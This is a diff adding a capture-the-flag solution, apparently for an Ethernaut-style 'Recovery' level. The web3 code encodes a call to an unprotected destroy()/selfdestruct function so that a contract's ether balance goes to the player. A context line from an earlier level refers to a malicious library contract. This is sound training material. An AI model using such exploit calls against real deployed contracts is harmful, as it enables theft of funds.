@@ -341,3 +341,21 @@ await contract.setFirstTime("<insert uint value of your malicious library contra
 await contract.setFirstTime("<insert uint value of your player>)
 
 ```
+
+## 17. Recovery
+Notice how there exists a function called `destroy()` which alls `selfdestruct()`. `selfdestruct()` is a way for you to "destroy" a contract and retrieve the entire eth balance at that address. So what you need to do is encode it into the `data` payload initiate a transaction to it. You need to analyse your transaction hash to determine the address of the lost contract. Once you have that, you should be able to solve this level.
+```
+data = web3.eth.abi.encodeFunctionCall({
+    name: 'destroy',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: '_to'
+    }]
+}, [player]);
+await web3.eth.sendTransaction({
+    to: "<insert the address of the lost contract>",
+    from: player,
+    data: data
+})
+```
